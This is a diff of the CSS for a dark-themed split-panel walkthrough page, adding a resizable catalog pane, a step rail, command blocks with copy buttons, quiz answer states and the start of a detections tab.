@@ -2,14 +2,14 @@
 <html data-theme="dark" lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Bolt-on walkthrough · C — Split panel (catalog + walkthrough)</title>
+    <title>Bolt-on walkthrough · C — Split panel (interactive)</title>
     <link rel="stylesheet" href="/css/palette.css">
     <link rel="stylesheet" href="/css/style.css">
     <style>
         /* ════════════════════════════════════════════════════════════════════
-           BOLT-ON WALKTHROUGH — LAYOUT C · SPLIT PANEL
-           Dials: 5/6/5. 38% catalog (left) + 62% walkthrough (right);
-           both panes scroll independently.
+           BOLT-ON WALKTHROUGH — LAYOUT C · SPLIT PANEL (interactive)
+           Dials: VARIANCE 5 / MOTION 6 / DENSITY 5.
+           Resizable split: catalog (left) | walkthrough (right).
            Chrome (top bar + left rail + sub-pill strip) identical to A/B/D.
            ════════════════════════════════════════════════════════════════════ */
 
@@ -18,6 +18,8 @@
             --rti-rail-w:     220px;
             --rti-subpill-h:  44px;
             --split-left:     38%;
+            --split-handle-w: 6px;
+            --motion-ease-walk: cubic-bezier(0.25, 0.46, 0.45, 0.94);
         }
 
         html, body {
@@ -169,22 +171,64 @@
         .rti-subpill__sep { color: var(--text-secondary); font-family: var(--font-family-mono); font-size: 11px; opacity: 0.4; padding: 0 2px; }
 
         /* ════════════════════════════════════════════════════════════
-           C-SPECIFIC: split panel layout
+           C-SPECIFIC: split panel layout (resizable)
            ════════════════════════════════════════════════════════════ */
         .bw-split {
             flex: 1;
             display: grid;
-            grid-template-columns: var(--split-left) 1fr;
+            grid-template-columns: var(--split-left) var(--split-handle-w) 1fr;
             min-height: 0;
             background: var(--bg-body);
+            position: relative;
         }
+        .bw-split.is-dragging { user-select: none; cursor: col-resize; }
+        .bw-split.is-dragging .bw-cat,
+        .bw-split.is-dragging .bw-walk { will-change: transform; }
+
+        /* ── DRAG HANDLE ────────────────────────────────────────────── */
+        .bw-handle {
+            position: relative;
+            background: var(--bg-section);
+            border-left: 1px solid var(--border-subtle);
+            border-right: 1px solid var(--border-subtle);
+            cursor: col-resize;
+            display: flex; align-items: center; justify-content: center;
+            transition: background-color var(--motion-duration-base) var(--motion-ease-walk);
+            touch-action: none;
+        }
+        .bw-handle::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            left: -3px; right: -3px;
+        }
+        .bw-handle__grip {
+            display: flex; flex-direction: column; gap: 3px;
+            opacity: 0.5;
+            transition: opacity var(--motion-duration-base) var(--motion-ease-walk),
+                        transform var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-handle__grip span {
+            display: block;
+            width: 2px; height: 2px;
+            border-radius: 50%;
+            background: var(--text-secondary);
+        }
+        .bw-handle:hover { background: color-mix(in srgb, var(--guide-accent) 14%, var(--bg-section)); }
+        .bw-handle:hover .bw-handle__grip { opacity: 1; transform: scaleY(1.4); }
+        .bw-handle:hover .bw-handle__grip span { background: var(--guide-accent); }
+        .bw-split.is-dragging .bw-handle { background: color-mix(in srgb, var(--guide-accent) 22%, var(--bg-section)); }
+        .bw-split.is-dragging .bw-handle__grip { opacity: 1; transform: scaleY(1.6); }
+        .bw-split.is-dragging .bw-handle__grip span { background: var(--guide-accent); }
 
         /* ── LEFT: CATALOG PANE ─────────────────────────────────────── */
         .bw-cat {
-            border-right: 1px solid var(--border-subtle);
             display: flex; flex-direction: column;
             background: var(--bg-container);
             min-height: 0;
+            overflow: hidden;
+            container-type: inline-size;
+            container-name: cat;
         }
         .bw-cat__head {
             padding: 18px 22px 12px;
@@ -200,24 +244,49 @@
             margin-bottom: 4px;
         }
         .bw-cat__title {
-            margin: 0 0 10px;
+            margin: 0 0 12px;
             font-size: 16px; font-weight: 700;
             color: var(--text-primary);
             letter-spacing: -0.005em;
         }
+        .bw-cat__controls {
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 8px;
+            margin-bottom: 0;
+        }
+        .bw-cat__search {
+            appearance: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-family: var(--font-family-base);
+            font-size: 12.5px;
+            padding: 7px 10px 7px 28px;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 16 16' fill='none'><circle cx='7' cy='7' r='5' stroke='%238a96a8' stroke-width='1.3'/><path d='M11 11l3 3' stroke='%238a96a8' stroke-width='1.3' stroke-linecap='round'/></svg>");
+            background-repeat: no-repeat;
+            background-position: 9px center;
+            transition: border-color var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-cat__search:focus { outline: none; border-color: var(--guide-accent); }
         .bw-cat__host {
-            display: flex; align-items: center; gap: 8px;
-            padding: 6px 10px;
+            appearance: none;
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 7px 26px 7px 10px;
             background: var(--bg-card);
             border: 1px solid var(--border-subtle);
             border-radius: 6px;
             font-family: var(--font-family-mono);
             font-size: 11px;
             color: var(--text-primary);
+            cursor: pointer;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10' viewBox='0 0 10 10' fill='none'><path d='M2 4l3 3 3-3' stroke='%238a96a8' stroke-width='1.3' stroke-linecap='round' stroke-linejoin='round'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            -webkit-appearance: none;
         }
-        .bw-cat__host-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--success); }
-        .bw-cat__host-name { font-weight: 600; }
-        .bw-cat__host-sub { color: var(--text-secondary); margin-left: auto; }
+        .bw-cat__host:focus { outline: none; border-color: var(--guide-accent); }
 
         .bw-cat__chips {
             display: flex; flex-wrap: wrap; gap: 6px;
@@ -237,9 +306,9 @@
             padding: 4px 10px;
             border-radius: 999px;
             cursor: pointer;
-            transition: background-color var(--motion-duration-base) var(--motion-easing-standard),
-                        border-color var(--motion-duration-base) var(--motion-easing-standard),
-                        color var(--motion-duration-base) var(--motion-easing-standard);
+            transition: background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        color var(--motion-duration-base) var(--motion-ease-walk);
         }
         .bw-cat__chip:hover { color: var(--text-primary); border-color: var(--border-light); }
         .bw-cat__chip.is-active { background: var(--bg-card-hover); color: var(--text-primary); border-color: var(--brand-light); box-shadow: inset 0 -2px 0 var(--brand-light); }
@@ -261,15 +330,18 @@
             background: var(--bg-card);
             margin-bottom: 6px;
             cursor: pointer;
-            transition: border-color var(--motion-duration-base) var(--motion-easing-standard),
-                        transform var(--motion-duration-base) var(--motion-easing-standard);
+            transition: border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        transform var(--motion-duration-base) var(--motion-ease-walk),
+                        opacity 220ms var(--motion-ease-walk);
         }
+        .bw-cat__row:nth-child(even) { background: color-mix(in srgb, var(--bg-card) 96%, var(--text-secondary) 4%); }
         .bw-cat__row:hover { border-color: var(--border-light); transform: translateY(-1px); }
         .bw-cat__row.is-selected {
             border-color: var(--guide-accent);
             background: color-mix(in srgb, var(--guide-accent) 8%, var(--bg-card));
             box-shadow: inset 3px 0 0 var(--guide-accent);
         }
+        .bw-cat__row.is-hidden { display: none; }
         .bw-cat__row-title {
             font-size: 12.5px;
             font-weight: 600;
@@ -283,6 +355,7 @@
             color: var(--text-secondary);
             letter-spacing: 0.02em;
             margin-bottom: 6px;
+            word-break: break-all;
         }
         .bw-cat__row-pills {
             display: flex; gap: 4px; flex-wrap: wrap;
@@ -308,24 +381,200 @@
             white-space: nowrap;
             text-align: right;
         }
+        .bw-cat__row-status .check { color: var(--success-text); margin-right: 4px; }
+
+        .bw-cat__empty {
+            padding: 32px 14px;
+            text-align: center;
+            font-family: var(--font-family-mono);
+            font-size: 11px;
+            color: var(--text-secondary);
+        }
+
+        /* Container queries — catalog adaptive density */
+        @container cat (max-width: 340px) {
+            .bw-cat__row-id { display: none; }
+            .bw-cat__row-pills .bw-pill:nth-child(n+3) { display: none; }
+            .bw-cat__head { padding: 14px 14px 10px; }
+            .bw-cat__chips { padding: 10px 14px; }
+            .bw-cat__list { padding: 6px 8px 24px; }
+            .bw-cat__controls { grid-template-columns: 1fr; }
+        }
+        @container cat (min-width: 441px) {
+            .bw-cat__row { padding: 14px 16px; }
+            .bw-cat__row-title { font-size: 13.5px; }
+        }
 
         /* ── RIGHT: WALKTHROUGH PANE ────────────────────────────────── */
         .bw-walk {
-            display: flex; flex-direction: column;
+            display: flex; flex-direction: row;
             background: var(--bg-body);
             min-height: 0;
+            overflow: hidden;
+            container-type: inline-size;
+            container-name: walk;
         }
-        .bw-walk__head {
-            padding: 18px 28px 0;
+
+        /* Step rail (left side of walkthrough pane) */
+        .bw-rail {
+            width: 180px;
+            flex-shrink: 0;
+            border-right: 1px solid var(--border-subtle);
+            background: var(--bg-section);
+            display: flex; flex-direction: column;
+            overflow: hidden;
+        }
+        .bw-rail__head {
+            padding: 14px 14px 10px;
+            border-bottom: 1px solid var(--border-subtle);
+            font-family: var(--font-family-mono);
+            font-size: 9.5px; font-weight: 700;
+            color: var(--text-secondary);
+            letter-spacing: 0.14em; text-transform: uppercase;
+        }
+        .bw-rail__list {
+            list-style: none;
+            margin: 0; padding: 8px 6px;
+            flex: 1;
+            overflow-y: auto;
+        }
+        .bw-rail__step {
+            display: grid;
+            grid-template-columns: 22px 1fr;
+            gap: 8px;
+            align-items: start;
+            padding: 8px 8px;
+            margin: 1px 0;
+            border-radius: 6px;
+            cursor: pointer;
+            border-left: 2px solid transparent;
+            transition: background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        opacity var(--motion-duration-base) var(--motion-ease-walk);
+            text-align: left;
+            appearance: none;
+            background: transparent;
+            border: 1px solid transparent;
+            border-left: 2px solid transparent;
+            color: var(--text-secondary);
+            width: calc(100% - 2px);
+        }
+        .bw-rail__step:hover { background: var(--bg-card-hover); color: var(--text-primary); }
+        .bw-rail__step.is-current {
+            background: color-mix(in srgb, var(--guide-accent) 12%, var(--bg-card-hover));
+            color: var(--text-primary);
+            border-left-color: var(--guide-accent);
+        }
+        .bw-rail__step.is-future { opacity: 0.55; }
+        .bw-rail__step.is-future:hover { opacity: 1; }
+        .bw-rail__step-num {
+            width: 22px; height: 22px;
+            border-radius: 50%;
+            display: inline-flex; align-items: center; justify-content: center;
+            border: 1px solid var(--border-subtle);
+            background: var(--bg-card);
+            font-family: var(--font-family-mono);
+            font-size: 10.5px; font-weight: 700;
+            color: var(--text-secondary);
+            transition: background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        color var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-rail__step.is-current .bw-rail__step-num {
+            background: var(--guide-accent);
+            border-color: var(--guide-accent);
+            color: #001216;
+        }
+        .bw-rail__step.is-done .bw-rail__step-num {
+            background: var(--success-bg);
+            border-color: var(--success-border);
+            color: var(--success-text);
+        }
+        .bw-rail__step-text {
+            font-size: 11.5px;
+            font-weight: 500;
+            line-height: 1.35;
+            min-width: 0;
+            color: inherit;
+        }
+        .bw-rail__step-time {
+            display: block;
+            margin-top: 2px;
+            font-family: var(--font-family-mono);
+            font-size: 9.5px;
+            color: var(--text-secondary);
+            opacity: 0.8;
+        }
+        .bw-rail__foot {
+            padding: 10px 12px;
+            border-top: 1px solid var(--border-subtle);
+            display: flex; flex-direction: column; gap: 8px;
+        }
+        .bw-rail__reset {
+            appearance: none;
+            background: transparent;
+            border: 1px solid var(--border-subtle);
+            color: var(--text-secondary);
+            font-family: var(--font-family-mono);
+            font-size: 10px; font-weight: 600;
+            padding: 5px 8px; border-radius: 5px;
+            cursor: pointer;
+            letter-spacing: 0.04em; text-transform: uppercase;
+            transition: border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        color var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-rail__reset:hover { border-color: var(--danger); color: var(--danger-text); }
+        .bw-rail__kbd-hint {
+            font-family: var(--font-family-mono);
+            font-size: 9.5px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            opacity: 0.75;
+        }
+        .bw-rail__kbd-hint kbd {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 3px;
+            padding: 0 4px;
+            font-family: inherit; font-size: 9.5px;
+            color: var(--text-primary);
+        }
+
+        /* Walkthrough body column (right of step rail) */
+        .bw-body-col {
+            flex: 1;
+            min-width: 0;
+            display: flex; flex-direction: column;
+            background: var(--bg-body);
+        }
+
+        /* Sticky context header */
+        .bw-sticky {
+            position: sticky; top: 0;
+            z-index: 5;
             background: var(--bg-body);
             border-bottom: 1px solid var(--border-subtle);
+            padding: 14px 24px 0;
             flex-shrink: 0;
         }
-        .bw-walk__head-row {
-            display: flex; align-items: flex-start; justify-content: space-between;
-            gap: 18px; margin-bottom: 14px;
+        .bw-sticky__back {
+            appearance: none;
+            background: transparent; border: 0;
+            color: var(--text-secondary);
+            font-family: var(--font-family-mono);
+            font-size: 10.5px; font-weight: 600;
+            letter-spacing: 0.06em;
+            padding: 2px 0 6px;
+            cursor: pointer;
+            display: inline-flex; align-items: center; gap: 6px;
+            transition: color var(--motion-duration-base) var(--motion-ease-walk);
         }
-        .bw-walk__head-text { min-width: 0; flex: 1; }
+        .bw-sticky__back:hover { color: var(--guide-accent-text); }
+        .bw-sticky__head-row {
+            display: flex; align-items: flex-start; justify-content: space-between;
+            gap: 16px;
+        }
+        .bw-sticky__head-text { min-width: 0; flex: 1; }
         .bw-eyebrow {
             font-family: var(--font-family-mono);
             font-size: 9.5px; font-weight: 600;
@@ -335,10 +584,10 @@
         }
         .bw-title {
             margin: 0 0 6px;
-            font-size: 19px; font-weight: 700;
+            font-size: 18px; font-weight: 700;
             color: var(--text-primary);
             letter-spacing: -0.01em;
-            line-height: 1.2;
+            line-height: 1.25;
         }
         .bw-subtitle {
             margin: 0;
@@ -347,14 +596,50 @@
             color: var(--text-secondary);
         }
         .bw-subtitle strong { color: var(--text-primary); font-weight: 600; }
+
+        .bw-sticky__right { display: flex; flex-direction: column; align-items: flex-end; gap: 6px; }
         .bw-dots { display: inline-flex; align-items: center; gap: 6px; }
-        .bw-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--bg-card-hover); border: 1px solid var(--border-subtle); }
+        .bw-dot {
+            appearance: none;
+            width: 9px; height: 9px;
+            border-radius: 50%;
+            background: var(--bg-card-hover);
+            border: 1px solid var(--border-subtle);
+            cursor: pointer;
+            padding: 0;
+            transition: transform var(--motion-duration-base) var(--motion-ease-walk),
+                        background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-dot:hover { transform: scale(1.25); border-color: var(--guide-accent); }
         .bw-dot.is-done { background: var(--guide-accent); border-color: var(--guide-accent); }
         .bw-dot.is-current { background: var(--guide-accent); border-color: var(--guide-accent); box-shadow: 0 0 0 3px color-mix(in srgb, var(--guide-accent) 25%, transparent); }
-        .bw-dots__label { font-family: var(--font-family-mono); font-size: 10.5px; color: var(--text-secondary); letter-spacing: 0.06em; margin-left: 10px; }
+        .bw-step-label { font-family: var(--font-family-mono); font-size: 10.5px; color: var(--text-secondary); letter-spacing: 0.06em; }
 
+        /* Progress bar */
+        .bw-progress {
+            margin-top: 12px;
+            height: 3px;
+            background: var(--bg-card-hover);
+            border-radius: 999px;
+            overflow: hidden;
+            position: relative;
+        }
+        .bw-progress__bar {
+            position: absolute;
+            top: 0; left: 0;
+            height: 100%;
+            width: 0%;
+            background: var(--guide-accent);
+            border-radius: 999px;
+            transform-origin: left;
+            transition: width 320ms var(--motion-ease-walk);
+        }
+
+        /* Tab strip */
         .bw-tabs {
-            display: flex; gap: 4px;
+            display: flex; gap: 2px;
+            margin-top: 12px;
         }
         .bw-tab {
             appearance: none; background: transparent; border: 0;
@@ -365,21 +650,22 @@
             letter-spacing: 0.08em; text-transform: uppercase;
             padding: 9px 14px 11px;
             cursor: pointer;
-            transition: color var(--motion-duration-base) var(--motion-easing-standard),
-                        border-color var(--motion-duration-base) var(--motion-easing-standard);
+            transition: color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk);
         }
         .bw-tab:hover { color: var(--text-primary); }
         .bw-tab.is-active { color: var(--text-primary); border-bottom-color: var(--brand-light); }
 
+        /* Body scroller */
         .bw-walk__body {
             overflow-y: auto;
             flex: 1;
             min-height: 0;
-            padding: 22px 28px 24px;
+            padding: 24px 24px 32px;
         }
 
         /* ── ARTICLE BODY ───────────────────────────────────────────── */
-        .bw-article { max-width: 680px; }
+        .bw-article { max-width: 760px; }
         .bw-article__head {
             display: flex; align-items: baseline; justify-content: space-between;
             gap: 12px; margin-bottom: 4px;
@@ -387,12 +673,13 @@
         .bw-article__eyebrow { font-family: var(--font-family-mono); font-size: 9.5px; font-weight: 600; color: var(--guide-accent-text); letter-spacing: 0.14em; text-transform: uppercase; }
         .bw-article__time { font-family: var(--font-family-mono); font-size: 11px; color: var(--text-secondary); }
         .bw-article__title {
-            margin: 4px 0 14px;
+            margin: 4px 0 16px;
             font-size: 17px; font-weight: 700;
             color: var(--text-primary);
             letter-spacing: -0.005em;
+            line-height: 1.3;
         }
-        .bw-article p { color: var(--text-primary); line-height: 1.6; margin: 6px 0 12px; font-size: 13.5px; }
+        .bw-article p { color: var(--text-primary); line-height: 1.65; margin: 6px 0 14px; font-size: 13.5px; }
         .bw-article code {
             background: var(--bg-card-hover);
             border: 1px solid var(--border-subtle);
@@ -400,47 +687,110 @@
             font-family: var(--font-family-mono); font-size: 12px;
             color: var(--text-primary);
         }
-        .bw-article pre {
+
+        /* Command block w/ copy button */
+        .bw-cmd {
+            position: relative;
+            margin: 10px 0 16px;
+        }
+        .bw-cmd__pre {
             background: var(--bg-terminal);
             color: var(--text-terminal);
             border: 1px solid var(--border-subtle);
             border-radius: var(--radius-sm);
-            padding: 10px 12px;
-            margin: 8px 0 14px;
+            padding: 12px 60px 12px 14px;
+            margin: 0;
             font-family: var(--font-family-mono);
-            font-size: 12px; line-height: 1.55;
+            font-size: 12px; line-height: 1.6;
             overflow-x: auto;
+            white-space: pre;
         }
-        .bw-article pre code { background: transparent; border: 0; padding: 0; color: inherit; font-size: 12px; }
-        .bw-article__callout {
+        .bw-cmd__pre code { background: transparent; border: 0; padding: 0; color: inherit; font-size: 12px; font-family: inherit; }
+        .bw-cmd__copy {
+            position: absolute;
+            top: 7px; right: 7px;
+            appearance: none;
+            background: color-mix(in srgb, var(--bg-terminal) 70%, var(--text-terminal) 30%);
+            border: 1px solid color-mix(in srgb, var(--text-terminal) 30%, transparent);
+            color: var(--text-terminal);
+            font-family: var(--font-family-mono);
+            font-size: 10px; font-weight: 600;
+            letter-spacing: 0.06em; text-transform: uppercase;
+            padding: 4px 8px;
+            border-radius: 5px;
+            cursor: pointer;
+            display: inline-flex; align-items: center; gap: 5px;
+            opacity: 0.55;
+            transition: opacity var(--motion-duration-base) var(--motion-ease-walk),
+                        background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        color var(--motion-duration-base) var(--motion-ease-walk),
+                        transform var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-cmd:hover .bw-cmd__copy { opacity: 1; }
+        .bw-cmd__copy:hover { background: var(--guide-accent); border-color: var(--guide-accent); color: #001216; transform: translateY(-1px); }
+        .bw-cmd__copy.is-copied { background: var(--success-bg); border-color: var(--success-border); color: var(--success-text); opacity: 1; }
+        .bw-cmd__copy svg { width: 11px; height: 11px; }
+        .bw-cmd__label {
+            display: block;
+            font-family: var(--font-family-mono);
+            font-size: 10px; font-weight: 600;
+            color: var(--text-secondary);
+            letter-spacing: 0.1em; text-transform: uppercase;
+            margin: 14px 0 4px;
+        }
+
+        /* Output block — no copy button */
+        .bw-output {
+            background: color-mix(in srgb, var(--bg-terminal) 60%, var(--bg-card));
+            color: var(--text-terminal);
+            border: 1px dashed color-mix(in srgb, var(--text-terminal) 25%, transparent);
+            border-radius: var(--radius-sm);
+            padding: 10px 14px;
+            margin: 4px 0 14px;
+            font-family: var(--font-family-mono);
+            font-size: 11.5px; line-height: 1.55;
+            overflow-x: auto;
+            white-space: pre;
+        }
+
+        /* Callout */
+        .bw-callout {
             display: flex; flex-direction: column; gap: 6px;
-            margin: 14px 0; padding: 12px 14px;
+            margin: 16px 0; padding: 14px 16px;
             background: var(--guide-accent-soft);
             border: 1px solid color-mix(in srgb, var(--guide-accent) 40%, transparent);
             border-left: 3px solid var(--guide-accent);
             border-radius: var(--radius-sm);
         }
-        .bw-article__callout-eyebrow { font-family: var(--font-family-mono); font-size: 9.5px; font-weight: 700; color: var(--guide-accent-text); letter-spacing: 0.12em; text-transform: uppercase; }
-        .bw-article__callout p { margin: 0; font-size: 12.5px; }
-        .bw-article__callout a { color: var(--guide-accent-text); text-decoration: underline; text-underline-offset: 3px; }
-        .bw-article__quote {
-            margin: 12px 0; padding: 10px 14px;
+        .bw-callout__eyebrow { font-family: var(--font-family-mono); font-size: 9.5px; font-weight: 700; color: var(--guide-accent-text); letter-spacing: 0.12em; text-transform: uppercase; }
+        .bw-callout p { margin: 0; font-size: 12.5px; }
+        .bw-callout a { color: var(--guide-accent-text); text-decoration: underline; text-underline-offset: 3px; }
+
+        /* Quote / detection */
+        .bw-quote {
+            margin: 14px 0; padding: 12px 14px;
             background: var(--bg-card-hover);
             border-left: 3px solid var(--brand-light);
             border-radius: var(--radius-sm);
             font-size: 12.5px; color: var(--text-primary);
+            line-height: 1.6;
         }
-        .bw-article__quote strong { color: var(--text-primary); }
+        .bw-quote strong { color: var(--text-primary); }
 
+        /* Quiz */
         .bw-quiz {
-            margin-top: 22px; padding: 14px;
+            margin-top: 24px; padding: 16px;
             background: var(--bg-card-hover);
             border: 1px solid var(--border-subtle);
             border-radius: var(--radius-sm);
         }
         .bw-quiz__heading { margin: 0 0 6px; font-family: var(--font-family-mono); font-size: 10px; font-weight: 700; color: var(--text-secondary); letter-spacing: 0.12em; text-transform: uppercase; }
-        .bw-quiz__q { margin: 0 0 10px; font-size: 13.5px; color: var(--text-primary); font-weight: 500; line-height: 1.5; }
-        .bw-quiz__opts { display: flex; flex-direction: column; gap: 6px; }
+        .bw-quiz__q { margin: 0 0 12px; font-size: 13.5px; color: var(--text-primary); font-weight: 500; line-height: 1.5; }
+        .bw-quiz__opts {
+            display: grid; gap: 6px;
+            grid-template-columns: 1fr;
+        }
         .bw-quiz__opt {
             appearance: none;
             background: var(--bg-card);
@@ -450,13 +800,25 @@
             border-radius: var(--radius-sm);
             text-align: left;
             font-family: inherit;
-            font-size: 12.5px;
+            font-size: 12.5px; line-height: 1.4;
             cursor: pointer;
-            display: flex; align-items: center; gap: 10px;
-            transition: background-color var(--motion-duration-base) var(--motion-easing-standard),
-                        border-color var(--motion-duration-base) var(--motion-easing-standard);
+            display: flex; align-items: flex-start; gap: 10px;
+            transition: background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        transform var(--motion-duration-base) var(--motion-ease-walk);
         }
-        .bw-quiz__opt:hover { background: var(--bg-card-hover); border-color: var(--brand-light); }
+        .bw-quiz__opt:hover { background: var(--bg-card-hover); border-color: var(--brand-light); transform: translateY(-1px); }
+        .bw-quiz__opt[disabled] { cursor: default; transform: none; }
+        .bw-quiz__opt.is-correct {
+            background: var(--success-bg);
+            border-color: var(--success-border);
+            color: var(--success-text);
+        }
+        .bw-quiz__opt.is-wrong {
+            background: var(--danger-bg);
+            border-color: var(--danger-border);
+            color: var(--danger-text);
+        }
         .bw-quiz__opt-marker {
             width: 22px; height: 22px; flex-shrink: 0; border-radius: 50%;
             background: var(--bg-card-hover);
@@ -465,14 +827,43 @@
             font-family: var(--font-family-mono); font-size: 10.5px; font-weight: 700;
             color: var(--text-secondary);
         }
+        .bw-quiz__opt.is-correct .bw-quiz__opt-marker {
+            background: var(--success-text);
+            color: var(--success-bg);
+            border-color: var(--success-text);
+        }
+        .bw-quiz__opt.is-wrong .bw-quiz__opt-marker {
+            background: var(--danger-text);
+            color: var(--danger-bg);
+            border-color: var(--danger-text);
+        }
+        .bw-quiz__explain {
+            margin-top: 12px;
+            padding: 10px 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-left: 3px solid var(--guide-accent);
+            border-radius: var(--radius-sm);
+            font-size: 12px; line-height: 1.55;
+            color: var(--text-primary);
+        }
+        .bw-quiz__explain strong { color: var(--guide-accent-text); }
 
+        @container walk (min-width: 860px) {
+            .bw-quiz__opts { grid-template-columns: 1fr 1fr; }
+        }
+
+        /* Footer (Back / Continue) */
         .bw-foot {
             display: flex; justify-content: space-between; align-items: center;
-            gap: 12px; margin-top: 24px;
-            padding-top: 16px;
+            gap: 12px; margin-top: 28px;
+            padding-top: 18px;
             border-top: 1px solid var(--border-subtle);
+            flex-wrap: wrap;
         }
-        .bw-foot__hint { font-family: var(--font-family-mono); font-size: 11px; color: var(--text-secondary); letter-spacing: 0.04em; }
+        .bw-foot__left { display: inline-flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+        .bw-foot__right { display: inline-flex; align-items: center; gap: 10px; }
+
         .bw-btn {
             appearance: none;
             background: var(--bg-card);
@@ -482,12 +873,342 @@
             padding: 9px 16px;
             border-radius: 6px; cursor: pointer;
             display: inline-flex; align-items: center; gap: 7px;
-            transition: border-color var(--motion-duration-base) var(--motion-easing-standard),
-                        background-color var(--motion-duration-base) var(--motion-easing-standard);
+            transition: border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        transform var(--motion-duration-base) var(--motion-ease-walk),
+                        opacity var(--motion-duration-base) var(--motion-ease-walk);
         }
-        .bw-btn:hover { border-color: var(--brand-light); background: var(--bg-card-hover); }
-        .bw-btn--primary { background: var(--brand-light); color: var(--text-on-primary); border-color: var(--brand-light); }
-        .bw-btn--primary:hover { background: var(--brand); border-color: var(--brand); }
+        .bw-btn:hover { border-color: var(--brand-light); background: var(--bg-card-hover); transform: translateY(-1px); }
+        .bw-btn[disabled] {
+            opacity: 0.4; cursor: not-allowed;
+            transform: none;
+        }
+        .bw-btn[disabled]:hover { border-color: var(--border-subtle); background: var(--bg-card); transform: none; }
+
+        .bw-btn--ghost {
+            background: transparent;
+        }
+        .bw-btn--primary {
+            background: var(--guide-accent);
+            color: #001216;
+            border-color: var(--guide-accent);
+            font-weight: 700;
+            padding: 10px 20px;
+        }
+        .bw-btn--primary:hover {
+            background: color-mix(in srgb, var(--guide-accent) 85%, white);
+            border-color: color-mix(in srgb, var(--guide-accent) 85%, white);
+            color: #001216;
+        }
+        .bw-btn--complete {
+            background: var(--success-bg);
+            color: var(--success-text);
+            border-color: var(--success-border);
+        }
+
+        .bw-foot__hint { font-family: var(--font-family-mono); font-size: 10.5px; color: var(--text-secondary); letter-spacing: 0.04em; opacity: 0.85; }
+
+        /* Mark-complete checkbox-button */
+        .bw-mark {
+            appearance: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-primary);
+            font-family: inherit; font-size: 12.5px; font-weight: 600;
+            padding: 9px 14px;
+            border-radius: 6px; cursor: pointer;
+            display: inline-flex; align-items: center; gap: 8px;
+            transition: border-color var(--motion-duration-base) var(--motion-ease-walk),
+                        background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        color var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-mark__box {
+            width: 16px; height: 16px;
+            border-radius: 3px;
+            border: 1.5px solid var(--text-secondary);
+            display: inline-flex; align-items: center; justify-content: center;
+            transition: background-color var(--motion-duration-base) var(--motion-ease-walk),
+                        border-color var(--motion-duration-base) var(--motion-ease-walk);
+        }
+        .bw-mark__box svg { width: 10px; height: 10px; opacity: 0; transition: opacity var(--motion-duration-base) var(--motion-ease-walk); }
+        .bw-mark:hover { border-color: var(--success-border); }
+        .bw-mark.is-done {
+            background: var(--success-bg);
+            color: var(--success-text);
+            border-color: var(--success-border);
+        }
+        .bw-mark.is-done .bw-mark__box {
+            background: var(--success-text);
+            border-color: var(--success-text);
+        }
+        .bw-mark.is-done .bw-mark__box svg { opacity: 1; }
+        .bw-mark.is-done .bw-mark__box svg path { stroke: var(--success-bg); }
+
+        /* ── EMPTY STATE ────────────────────────────────────────────── */
+        .bw-empty {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            height: 100%;
+            text-align: center;
+            padding: 40px;
+        }
+        .bw-empty__icon {
+            width: 72px; height: 72px;
+            border-radius: 50%;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            display: inline-flex; align-items: center; justify-content: center;
+            margin-bottom: 18px;
+            color: var(--guide-accent);
+        }
+        .bw-empty__title { font-size: 16px; font-weight: 700; margin: 0 0 6px; color: var(--text-primary); }
+        .bw-empty__sub { font-family: var(--font-family-mono); font-size: 11.5px; color: var(--text-secondary); margin: 0 0 18px; line-height: 1.6; max-width: 360px; }
+
+        /* ── DETECTIONS TAB ─────────────────────────────────────────── */
+        .bw-det { max-width: 860px; }
+        .bw-det__intro {
+            margin: 0 0 16px;
+            font-size: 13px; color: var(--text-primary); line-height: 1.6;
+        }
+        .bw-det__cov {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 4px 10px;
+            border-radius: 999px;
+            font-family: var(--font-family-mono);
+            font-size: 10.5px; font-weight: 700;
+            letter-spacing: 0.06em; text-transform: uppercase;
+            margin-bottom: 14px;
+        }
+        .bw-det__cov--covered { background: var(--success-bg); color: var(--success-text); border: 1px solid var(--success-border); }
